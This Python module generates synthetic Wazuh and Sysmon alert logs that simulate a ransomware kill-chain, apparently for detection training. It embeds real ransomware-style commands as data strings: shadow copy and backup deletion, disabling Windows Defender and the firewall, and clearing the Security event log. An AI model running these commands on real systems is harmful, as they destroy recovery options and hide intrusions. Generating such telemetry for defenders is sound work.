"""
EDR / Ransomware activity generator.

Wazuh detects ransomware through THREE correlated signal sources, all of which
this generator produces:

  1. FIM (syscheck) events  -> rules 550 (modified), 553 (deleted), 554 (added)
  2. Sysmon Event ID 1 (process creation) -> parent rule 61603
     + ransomware-specific commands (vssadmin Delete Shadows, etc.)
  3. VirusTotal integration -> rule 87105
     followed by Wazuh Active Response -> rule 100092 (remove-threat success)

Output is newline-delimited JSON, the shape the Wazuh agent forwards from
the Windows Security and Sysmon event channels.

NEW: victim user and host come from generators.shared_state instead of being
hardcoded. If INC-001 picked user 'svc_swift' on host 'WS-LOAN-22', the
ransomware encrypts THAT user's files on THAT host — same user/host that
appear in auth.log, AD, MSSQL, web, paloalto alerts. End-to-end correlation.

The dropper download is attributed to the scenario attacker_ip.
"""
import json
import random
from pathlib import Path
from datetime import timedelta
from .common import (
    USERNAMES, INTERNAL_IPS, ATTACKER_IPS,
    rand_recent, iso_z, pick,
)
from .shared_state import INCIDENTS


# Known ransomware family signatures we'll emulate
RANSOMWARE_FAMILIES = [
    {"name": "LockBit",   "extension": ".lockbit",
     "ransom_note": "Restore-My-Files.txt",
     "hash": "a4e7e4c2b9f8c7d6e5a4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2"},
    {"name": "BlackCat",  "extension": ".bc7e",
     "ransom_note": "RECOVER-FILES.txt",
     "hash": "be8e7c5a9d3f2b1a0c8e7d6f5b4a3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b"},
    {"name": "Conti",     "extension": ".conti",
     "ransom_note": "readme.txt",
     "hash": "c0f7e6d5c4b3a2918171615141312111e0d9c8b7a6f5e4d3c2b1a09f8e7d6c5b"},
    {"name": "Mamona",    "extension": ".HAes",
     "ransom_note": "README.HAes.txt",
     "hash": "d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0"},
]


def _victim_files(victim_user):
    """Files the ransomware will encrypt on the victim's machine."""
    return [
        f"C:\\Users\\{victim_user}\\Documents\\Q4_Financials.xlsx",
        f"C:\\Users\\{victim_user}\\Documents\\Budget_2026.docx",
        f"C:\\Users\\{victim_user}\\Documents\\Contract_Acme.pdf",
        f"C:\\Users\\{victim_user}\\Documents\\Tax_Returns.pdf",
        f"C:\\Users\\{victim_user}\\Desktop\\presentation.pptx",
        f"C:\\Users\\{victim_user}\\Desktop\\customer_list.csv",
        f"C:\\Users\\{victim_user}\\Pictures\\family_2024.jpg",
        f"C:\\Users\\{victim_user}\\Pictures\\vacation.png",
        f"C:\\Users\\{victim_user}\\Downloads\\report.pdf",
        f"C:\\Users\\{victim_user}\\Downloads\\meeting_notes.docx",
        f"C:\\Users\\{victim_user}\\AppData\\Local\\Mail\\backup.pst",
        "C:\\Users\\Public\\Documents\\company_handbook.pdf",
    ]


# -------- Sysmon Event ID 1 (process creation) ---------------------------
def _sysmon_process_create(ts, image, cmdline, parent_image, victim_host,
                           victim_host_short, victim_user, agent_ip):
    return {
        "timestamp": iso_z(ts),
        "agent": {"id": "002", "name": victim_host_short, "ip": agent_ip},
        "manager": {"name": "wazuh-manager"},
        "data": {
            "win": {
                "system": {
                    "providerName": "Microsoft-Windows-Sysmon",
                    "providerGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
                    "eventID": "1",
                    "version": "5",
                    "level": "4",
                    "task": "1",
                    "opcode": "0",
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "computer": victim_host,
                    "systemTime": iso_z(ts),
                    "eventRecordID": str(random.randint(100000, 999999)),
                    "processID": "2444",
                    "threadID": "3000",
                },
                "eventdata": {
                    "ruleName": "-",
                    "utcTime": iso_z(ts),
                    "processGuid": "{" + "-".join([
                        f"{random.randint(0, 0xffffffff):08x}",
                        f"{random.randint(0, 0xffff):04x}",
                        f"{random.randint(0, 0xffff):04x}",
                        f"{random.randint(0, 0xffff):04x}",
                        f"{random.randint(0, 0xffffffffffff):012x}",
                    ]) + "}",
                    "processId": str(random.randint(2000, 9999)),
                    "image": image,
                    "originalFileName": image.split("\\")[-1],
                    "commandLine": cmdline,
                    "currentDirectory": f"C:\\Users\\{victim_user}\\",
                    "user": f"BANK\\{victim_user}",
                    "logonGuid": "{00000000-0000-0000-0000-000000000000}",
                    "logonId": "0x" + f"{random.randint(0x10000, 0xfffff):x}",
                    "terminalSessionId": "1",
                    "integrityLevel": "High",
                    "parentProcessId": str(random.randint(1000, 1999)),
                    "parentImage": parent_image,
                    "parentCommandLine": f'"{parent_image}"',
                },
            }
        },
        "rule": {"groups": ["windows", "sysmon", "sysmon_event1"]},
        "location": "EventChannel",
        "decoder": {"name": "windows_eventchannel"},
    }


# -------- FIM (syscheck) events ------------------------------------------
def _fim_event(ts, path, event_type, victim_host_short, agent_ip, sha256=None):
    sha256 = sha256 or "".join(random.choices("0123456789abcdef", k=64))
    return {
        "timestamp": iso_z(ts),
        "agent": {"id": "002", "name": victim_host_short, "ip": agent_ip},
        "manager": {"name": "wazuh-manager"},
        "syscheck": {
            "path": path,
            "mode": "realtime",
            "event": event_type,
            "size_after": str(random.randint(10000, 5000000)),
            "perm_after": "rw-rw-rw-",
            "uid_after": "S-1-5-21-1004336348-1177238915-682003330-1234",
            "gid_after": "0",
            "md5_after": "".join(random.choices("0123456789abcdef", k=32)),
            "sha1_after": "".join(random.choices("0123456789abcdef", k=40)),
            "sha256_after": sha256,
            "mtime_after": iso_z(ts),
            "changed_attributes": ["size", "mtime", "md5", "sha1", "sha256"],
        },
        "rule": {
            "level": 7 if event_type == "modified" else 5,
            "description": {
                "added":    "File added to the system.",
                "modified": "Integrity checksum changed.",
                "deleted":  "File deleted.",
            }[event_type],
            "id": {"added": "554", "modified": "550", "deleted": "553"}[event_type],
            "mitre": {
                "id":      ["T1486"],
                "tactic":  ["Impact"],
                "technique": ["Data Encrypted for Impact"],
            },
            "groups": ["ossec", "syscheck", f"syscheck_entry_{event_type}",
                       "syscheck_file"],
        },
        "decoder": {"name": "syscheck_event"},
        "location": "syscheck",
    }


# -------- VirusTotal integration alert -----------------------------------
def _virustotal_alert(ts, file_path, sha256, family, victim_host_short,
                      agent_ip):
    return {
        "timestamp": iso_z(ts),
        "agent": {"id": "002", "name": victim_host_short, "ip": agent_ip},
        "manager": {"name": "wazuh-manager"},
        "integration": "virustotal",
        "virustotal": {
            "found": 1,
            "malicious": 1,
            "source": {
                "alert_id": f"{int(ts.timestamp())}.{random.randint(100000, 999999)}",
                "file": file_path,
                "md5":    "".join(random.choices("0123456789abcdef", k=32)),
                "sha1":   "".join(random.choices("0123456789abcdef", k=40)),
                "sha256": sha256,
            },
            "sha1":      "".join(random.choices("0123456789abcdef", k=40)),
            "scan_date": iso_z(ts),
            "positives": str(random.randint(45, 68)),
            "total":     "72",
            "permalink": f"https://www.virustotal.com/gui/file/{sha256}/detection",
            "malicious": 1,
        },
        "rule": {
            "level": 12,
            "description": (f"VirusTotal: Alert - {file_path} - "
                            f"{random.randint(45, 68)} engines detected this file "
                            f"({family})"),
            "id": "87105",
            "mitre": {
                "id":        ["T1203"],
                "tactic":    ["Execution"],
                "technique": ["Exploitation for Client Execution"],
            },
            "groups": ["virustotal"],
        },
        "decoder": {"name": "json"},
        "location": "virustotal",
    }


# -------- Active Response (file removed) ---------------------------------
def _active_response(ts, file_path, victim_host_short, agent_ip):
    return {
        "timestamp": iso_z(ts),
        "agent": {"id": "002", "name": victim_host_short, "ip": agent_ip},
        "manager": {"name": "wazuh-manager"},
        "data": {
            "command": "remove-threat.exe",
            "parameters": {
                "extra_args": [],
                "alert": {"data": {"virustotal": {"source": {"file": file_path}}}},
                "program": "remove-threat.exe",
            },
            "status": "SUCCESS",
        },
        "rule": {
            "level": 7,
            "description": (f"Active response: Successfully removed threat "
                            f"located at {file_path}"),
            "id": "100092",
            "groups": ["active_response", "ransomware"],
        },
        "decoder": {"name": "json"},
        "location": "active-response",
    }


# -------- High-level scenario assembly -----------------------------------
def _ransomware_scenario(start_ts, family, victim_user, victim_host,
                         attacker_ip):
    """Build a full ransomware kill-chain for ONE infected machine."""
    victim_host_short = victim_host.split(".")[0]
    agent_ip = f"10.1.{random.randint(200, 250)}.{random.randint(10, 250)}"
    events = []
    files = _victim_files(victim_user)

    # --- Initial dropper (browser writes EXE; download from attacker_ip) ---
    exe_path = (f"C:\\Users\\{victim_user}\\Downloads\\"
                f"invoice_{random.randint(1000, 9999)}.exe")
    ts = start_ts
    events.append((ts, _sysmon_process_create(
        ts,
        image="C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        cmdline=f'"chrome.exe" --download-url=http://{attacker_ip}/invoice.exe',
        parent_image="C:\\Windows\\explorer.exe",
        victim_host=victim_host,
        victim_host_short=victim_host_short,
        victim_user=victim_user,
        agent_ip=agent_ip,
    )))

    ts = start_ts + timedelta(seconds=5)
    events.append((ts, _fim_event(
        ts, exe_path, "added", victim_host_short, agent_ip,
        sha256=family["hash"])))

    ts = start_ts + timedelta(seconds=8)
    events.append((ts, _virustotal_alert(
        ts, exe_path, family["hash"], family["name"],
        victim_host_short, agent_ip)))

    ts = start_ts + timedelta(seconds=10)
    events.append((ts, _active_response(
        ts, exe_path, victim_host_short, agent_ip)))

    # --- AR fails / hash unknown: ransomware runs ----------------------
    ransom_exe = (f"C:\\Users\\{victim_user}\\AppData\\Local\\Temp\\"
                  f"{family['name'].lower()}.exe")

    ts = start_ts + timedelta(seconds=20)
    events.append((ts, _sysmon_process_create(
        ts, image=ransom_exe,
        cmdline=f'"{ransom_exe}" -encrypt -path C:\\Users\\{victim_user}',
        parent_image="C:\\Windows\\explorer.exe",
        victim_host=victim_host, victim_host_short=victim_host_short,
        victim_user=victim_user, agent_ip=agent_ip,
    )))

    # T1490 Inhibit Recovery
    for sec, image, cmdline in [
        (30, "C:\\Windows\\System32\\vssadmin.exe",
         "vssadmin.exe Delete Shadows /All /Quiet"),
        (35, "C:\\Windows\\System32\\wbadmin.exe",
         "wbadmin.exe delete catalog -quiet"),
        (40, "C:\\Windows\\System32\\bcdedit.exe",
         "bcdedit.exe /set {default} recoveryenabled No"),
        (45, "C:\\Windows\\System32\\wbem\\WMIC.exe",
         "wmic.exe shadowcopy delete"),
        (50, "C:\\Windows\\System32\\reg.exe",
         'reg.exe add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" '
         '/v DisableAntiSpyware /t REG_DWORD /d 1 /f'),
        (55, "C:\\Windows\\System32\\netsh.exe",
         "netsh.exe advfirewall set currentprofile state off"),
    ]:
        ts = start_ts + timedelta(seconds=sec)
        events.append((ts, _sysmon_process_create(
            ts, image=image, cmdline=cmdline, parent_image=ransom_exe,
            victim_host=victim_host, victim_host_short=victim_host_short,
            victim_user=victim_user, agent_ip=agent_ip)))

    # --- Mass file encryption ----------------------------------------
    for i, vfile in enumerate(files):
        ts_mod = start_ts + timedelta(seconds=60 + i * 2)
        events.append((ts_mod, _fim_event(
            ts_mod, vfile, "modified", victim_host_short, agent_ip)))
        ts_add = start_ts + timedelta(seconds=61 + i * 2)
        events.append((ts_add, _fim_event(
            ts_add, vfile + family["extension"], "added",
            victim_host_short, agent_ip)))
        ts_del = start_ts + timedelta(seconds=62 + i * 2)
        events.append((ts_del, _fim_event(
            ts_del, vfile, "deleted", victim_host_short, agent_ip)))

    # --- Ransom notes dropped in every monitored directory ------------
    note_dirs = [
        f"C:\\Users\\{victim_user}\\Documents",
        f"C:\\Users\\{victim_user}\\Desktop",
        f"C:\\Users\\{victim_user}\\Pictures",
        f"C:\\Users\\{victim_user}\\Downloads",
        "C:\\Users\\Public\\Documents",
    ]
    for i, d in enumerate(note_dirs):
        ts_note = start_ts + timedelta(seconds=180 + i * 2)
        events.append((ts_note, _fim_event(
            ts_note, f"{d}\\{family['ransom_note']}", "added",
            victim_host_short, agent_ip)))

    # --- Clear Windows event logs (cover tracks) ----------------------
    ts = start_ts + timedelta(seconds=200)
    events.append((ts, _sysmon_process_create(
        ts, image="C:\\Windows\\System32\\wevtutil.exe",
        cmdline="wevtutil.exe cl Security",
        parent_image=ransom_exe,
        victim_host=victim_host, victim_host_short=victim_host_short,
        victim_user=victim_user, agent_ip=agent_ip)))

    return events


def generate(path: Path, count: int = 1) -> None:
    """
    Each incident in shared_state.INCIDENTS that has a "compromisable" victim
    gets one ransomware kill-chain. `count` is kept for legacy compatibility
    but the actual number of scenarios = number of incidents.

    If for some reason there are no eligible incidents, fall back to a single
    random ransomware burst so the file is non-empty.
    """
    all_events = []
    eligible = [inc for inc in INCIDENTS
                if inc["victim_priv"] in ("admin", "manager", "service", "user")]

    if not eligible:
        # Shouldn't happen in practice — fallback
        eligible = INCIDENTS or [{
            "victim_user": "alopez",
            "victim_host": "WS-FIN-04.bank.local",
            "attacker_ip": pick(ATTACKER_IPS),
        }]

    families_used = []
    for inc in eligible:
        family = pick(RANSOMWARE_FAMILIES)
        families_used.append(f"{family['name']} -> {inc['victim_user']}@"
                             f"{inc['victim_host'].split('.')[0]}")
        scenario_start = rand_recent(60)
        all_events.extend(_ransomware_scenario(
            scenario_start, family,
            victim_user=inc["victim_user"],
            victim_host=inc["victim_host"],
            attacker_ip=inc["attacker_ip"]))

    all_events.sort(key=lambda x: x[0])
    with path.open("w", encoding="utf-8") as f:
        for _, ev in all_events:
            f.write(json.dumps(ev, separators=(",", ":")) + "\n")

    print(f"  wrote {len(all_events)} EDR/ransomware events across "
          f"{len(eligible)} infected machine(s) -> {path.name}")
    for fam in families_used:
        print(f"    {fam}")